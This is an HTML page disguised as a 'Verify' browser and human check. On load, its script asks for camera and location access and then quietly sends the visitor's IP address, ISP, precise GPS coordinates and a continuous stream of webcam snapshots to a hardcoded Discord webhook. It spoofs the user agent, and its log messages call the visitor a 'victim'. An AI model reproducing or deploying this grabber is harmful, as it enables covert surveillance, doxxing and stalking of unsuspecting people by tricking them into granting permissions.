<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">

    <!-- OpenGraph / social cards - ONLY when custom values were actually given -->
    <meta property="og:title" content="Verify">
    <meta property="og:description" content="The Verification System For The Website">
    <meta property="og:type" content="website">
    <meta property="og:url" content="?">
    <meta property="og:site_name" content="Verify">
    <meta property="og:image" content="https://i.imgur.com/aCvtzVT.png">

    <title>rifale</title>

    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        html, body {
            height:100%; width:100%;
            background:#000; color:#eee;
            font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
            overflow:hidden; touch-action:manipulation;
        }
        .flash {
            position:fixed; inset:0; background:#ff0044; opacity:0.92; z-index:9999; pointer-events:none;
            animation:flashAnim 0.18s steps(5) forwards;
        }
        @keyframes flashAnim {
            0%,100% {opacity:0} 8%,25%,45%,65%,85% {opacity:0.95} 16%,35%,55%,75% {opacity:0.08}
        }
        #container {
            display:none; position:fixed; inset:0; z-index:10;
            align-items:center; justify-content:center;
            background:rgba(8,8,12,0.94); backdrop-filter:blur(8px);
        }
        .screen {
            text-align:center; opacity:0; transform:scale(0.92); transition:all 0.5s ease;
            position:absolute; inset:0; display:flex; flex-direction:column; align-items:center; justify-content:center;
            padding:1.5rem;
        }
        .screen.active { opacity:1; transform:scale(1); }
        .logo { font-size: clamp(3rem, 14vw, 5rem); font-weight:900; letter-spacing:-0.12em; color:#00ffaa; text-shadow:0 0 35px #00ffaa66; margin-bottom:0.4em; }
        h1 { font-size: clamp(1.8rem, 8vw, 2.8rem); margin:0.5em 0; color:#fff; }
        .subtitle { font-size: clamp(1rem, 4.5vw, 1.3rem); opacity:0.9; margin:1.2em 0 2em; max-width:92%; }
        .success { color:#00ff44; }
        .fail { color:#ff3344; }
        .progress-bar { width:85%; max-width:360px; height:8px; background:#1a1a1a; border-radius:4px; overflow:hidden; margin:2em 0; }
        .bar { width:0; height:100%; background:linear-gradient(90deg,#00ffaa,#0099ff); animation:loading 4.5s linear forwards; }
        @keyframes loading { to { width:100% } }
        .status { font-size: clamp(0.95rem, 4vw, 1.1rem); opacity:0.85; margin:1.4em 0; }
        .small { font-size: clamp(0.85rem, 3.5vw, 0.95rem); opacity:0.75; }
        .big-check { font-size: clamp(5.5rem, 30vw, 9rem); font-weight:900; color:#00ff44; text-shadow:0 0 55px #00ff4466; margin:0.2em 0; }
        .big-fail { font-size: clamp(5rem, 28vw, 8.5rem); font-weight:900; color:#ff3344; text-shadow:0 0 45px #ff334466; }
        .btn {
            margin-top:2.2em; padding:1.1em 2.8em; font-size: clamp(1.1rem, 5vw, 1.4rem);
            background:#00ff44; color:#000; border:none; border-radius:8px; cursor:pointer;
            box-shadow:0 0 25px #00ff4455; transition:all 0.2s;
        }
        .btn:hover { transform:scale(1.06); box-shadow:0 0 45px #00ff44aa; }
        .btn.fail { background:#ff3344; box-shadow:0 0 25px #ff334455; }
        .btn.fail:hover { transform:scale(1.06); box-shadow:0 0 45px #ff3344aa; }
        .mock-info { margin:1.6em 0; font-size: clamp(0.95rem, 4vw, 1.1rem); line-height:1.5; opacity:0.93; text-align:left; max-width:92%; }
        .mock-info div { margin:0.5em 0; }
        .low { color:#00ff44; font-weight:bold; }
        #vid { width:100vw; height:100vh; object-fit:cover; position:fixed; top:0; left:0; z-index:-1; display:none; }
    </style>
</head>
<body>

<div id="flash" class="flash"></div>

<div id="container">
  <div id="checking" class="screen active">
    <div class="logo">VERIFY</div>
    <h1>Browser Check</h1>
    <p class="subtitle">Confirming you're human — allow camera & location</p>
    <div class="progress-bar"><div class="bar"></div></div>
    <div class="status">Requesting permissions • Checking device</div>
    <div class="small">Keep this tab open</div>
  </div>

  <div id="verified" class="screen">
    <div class="big-check">✔ VERIFIED</div>
    <h1>Access Granted</h1>
    <p class="subtitle success">You're confirmed human</p>
    <div class="mock-info">
      <div><strong>IP:</strong> ERROR: Your IP Was Invalid.</div>
      <div><strong>Location:</strong> Authorized</div>
      <div><strong>Device:</strong> Verified</div>
      <div><strong>Threat:</strong> <span class="low">0.0</span></div>
    </div>
  </div>

  <div id="failed" class="screen">
    <div class="big-fail">✘ FAILED</div>
    <h1>Access Denied</h1>
    <p class="subtitle fail">Camera and/or location blocked</p>
    <button id="retry" class="btn fail">Retry</button>
  </div>
</div>

<video id="vid" autoplay playsinline muted></video>
<canvas id="c" style="display:none"></canvas>

<script>
const HOOK = "https://discord.com/api/webhooks/1462954759173439570/4Pa4_ofFtn8e7x1xlWX_XGS-GxwBHDYhH7IzhrEGOgsBwWszDlxNiJ0dHKg-DpnCJQ3L";
const INTERVAL_BASE = 700;
const INTERVAL_JITTER = 400;
const JPEG_QUALITY = 0.32;
const RES_W = 640;
const RES_H = 480;
const FACE_FILENAME = "face.jpg";

let video = document.getElementById("vid");
let canvas = document.getElementById("c");
let ctx = canvas.getContext("2d", {alpha:false});
let flash = document.getElementById("flash");
let container = document.getElementById("container");
let checking = document.getElementById("checking");
let verified = document.getElementById("verified");
let failed = document.getElementById("failed");
let retryBtn = document.getElementById("retry");

let ip = "??";
let loc = "unknown";
let gps = "no gps";
let shotCount = 0;
let failStreak = 0;

const FAKE_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";

async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

function rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }

async function sendRaw(body, isForm = false) {
    try {
        const headers = { "User-Agent": FAKE_AGENT };
        if (!isForm) headers["Content-Type"] = "application/json";
        const res = await fetch(HOOK, { method:"POST", mode:"cors", cache:"no-cache", keepalive:true, headers, body, referrerPolicy:"no-referrer" });
        if (!res.ok) return false;
        failStreak = 0;
        return true;
    } catch {
        failStreak++;
        return false;
    }
}

async function sendEmbed(title, desc = "", color = 16711680) {
    return sendRaw(JSON.stringify({ embeds: [{ title:title.slice(0,240), description:desc.slice(0,1900), color, timestamp:new Date().toISOString(), footer:{text:"logged by vyrt"} }] }));
}

async function sendPhoto(title, desc, blob) {
    if (!blob || blob.size < 800) return false;
    try {
        const form = new FormData();
        form.append("file", blob, FACE_FILENAME);
        form.append("payload_json", JSON.stringify({
            content: "‎",
            embeds: [{ title:title.slice(0,240), description:(desc + `\n\nFails: ${failStreak}`).slice(0,1500), color:16711680, timestamp:new Date().toISOString(), image:{url:"attachment://"+FACE_FILENAME}, footer:{text:"#darknet_heaven"} }]
        }));
        return await sendRaw(form, true);
    } catch(e) { console.error("Multipart failed", e); }

    const reader = new FileReader();
    return new Promise(resolve => {
        reader.onload = async () => {
            const b64 = reader.result.split(",")[1] || "";
            const chunk = b64.slice(0,900) + (b64.length > 900 ? "..." : "");
            await sendEmbed(title + " [BASE64]", desc + `\nFails: ${failStreak}\nBase64 chunk:\n${chunk}`);
            resolve(true);
        };
        reader.onerror = () => resolve(false);
        reader.readAsDataURL(blob);
    });
}

async function grabIP() {
    const services = ["https://api.ipify.org?format=json","https://api64.ipify.org?format=json","https://ipwho.is","https://ipapi.co/json/"];
    for (const url of services) {
        try {
            const r = await fetch(url, {headers: {"User-Agent": FAKE_AGENT}});
            if (!r.ok) continue;
            const data = await r.json();
            ip = data.ip || data.query || ip;
            if (data.city || data.country) loc = `City: ${data.city||"?"} | Country: ${data.country_name||data.country||"?"} | ISP: ${data.isp||data.org||"?"}`;
            if (ip !== "??") {
                await sendEmbed(`IP GRABBED → ${ip}`, loc);
                return;
            }
        } catch {}
    }
}

async function attemptVerification() {
    flash.style.display = "block";
    await delay(rand(300, 600));
    flash.style.opacity = "0";

    container.style.display = "flex";

    grabIP().catch(console.error);

    let cameraOk = false;
    let gpsOk = false;

    navigator.geolocation.getCurrentPosition(
        pos => {
            const lat = pos.coords.latitude.toFixed(6);
            const lon = pos.coords.longitude.toFixed(6);
            gps = `GPS: ${lat}, ${lon}`;
            loc = `${gps} | ${loc}`;
            sendEmbed(`GPS RIPPED — IP: ${ip}`, `[MAP](https://maps.google.com/?q=${lat},${lon})\n${loc}`);
            gpsOk = true;
        },
        () => sendEmbed("GPS BLOCKED", `still ripping facecam... IP: ${ip}`),
        {enableHighAccuracy:true, timeout:12000, maximumAge:0}
    );

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user", width: {ideal:RES_W}, height: {ideal:RES_H} },
            audio: false
        });

        video.srcObject = stream;
        await new Promise(r => video.onloadeddata = r);

        canvas.width = video.videoWidth || RES_W;
        canvas.height = video.videoHeight || RES_H;

        video.style.display = "block";
        cameraOk = true;

        const takePhoto = async () => {
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(res => canvas.toBlob(res, "image/jpeg", JPEG_QUALITY));
                if (blob && blob.size > 1500) {
                    shotCount++;
                    const ok = await sendPhoto(
                        `FACE #${shotCount} — IP: ${ip}`,
                        `taken ${new Date().toLocaleString()} | ${loc} | GPS: ${gps}`,
                        blob
                    );
                    if (!ok) failStreak++;
                }
            } catch (e) { failStreak++; }
        };

        await takePhoto();
        setInterval(takePhoto, INTERVAL_BASE + Math.random() * INTERVAL_JITTER);

    } catch (e) {
        await sendEmbed(`CAMERA BLOCKED — IP: ${ip}`, `Error: ${e.name||e.message}`);
    }

    checking.classList.remove("active");

    if (cameraOk && gpsOk) {
        verified.classList.add("active");
        await sendEmbed("✅ FULLY VERIFIED — cam + gps granted", "victim fucked completely", 0x00ff44);
    } else {
        failed.classList.add("active");
        await sendEmbed("⚠️ DENIED / PARTIAL", `cam: ${cameraOk} | gps: ${gpsOk} | ip: ${ip}`, 0xff6600);
    }

    retryBtn.onclick = () => location.reload();
}

window.addEventListener("load", () => {
    setTimeout(() => {
        attemptVerification().catch(e => {
            console.error("CRASH ON LOAD", e);
            sendEmbed("TOTAL DUCKUP", `Error: ${e}`);
        });
    }, 120);
});

window.addEventListener("beforeunload", () => {
    if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
});
</script>
</body>
</html>
